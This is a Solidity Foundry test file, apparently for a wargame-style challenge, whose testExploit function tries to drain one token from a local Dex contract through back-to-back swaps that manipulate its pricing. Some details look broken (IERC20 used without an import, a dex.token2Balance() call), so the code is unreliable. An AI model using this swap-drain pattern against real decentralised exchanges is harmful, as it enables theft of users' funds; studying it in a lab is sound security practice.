// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex} from "../src/dex.sol";

contract DexExploitTest is Test {
    Dex dex;
    address player;
    IERC20 token1;
    IERC20 token2;

    function setUp() public {
        dex = new Dex();
        token1 = dex.token1();
        token2 = dex.token2();

        // Deploy and setup tokens for testing
        player = address(0x123);
        deal(address(token1), player, 1000 ether);
        deal(address(token2), player, 1000 ether);

        vm.startPrank(player);
        token1.approve(address(dex), 1000 ether);
        token2.approve(address(dex), 1000 ether);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player);

        // Step 1: Drain token1 from the dex
        uint256 initialDexToken1Balance = token1.balanceOf(address(dex));
        uint256 initialDexToken2Balance = token2.balanceOf(address(dex));

        dex.swap(address(token1), address(token2), 10 ether);  // Swap 10 token1 for token2
        dex.swap(address(token2), address(token1), dex.token2Balance());  // Swap all token2 for token1

        // Validate the exploitation result
        uint256 finalDexToken1Balance = token1.balanceOf(address(dex));
        uint256 finalDexToken2Balance = token2.balanceOf(address(dex));

        assertEq(finalDexToken1Balance, 0, "DEX should have 0 token1 balance");
        assertGt(finalDexToken2Balance, initialDexToken2Balance, "DEX token2 balance should increase");

        vm.stopPrank();
    }
}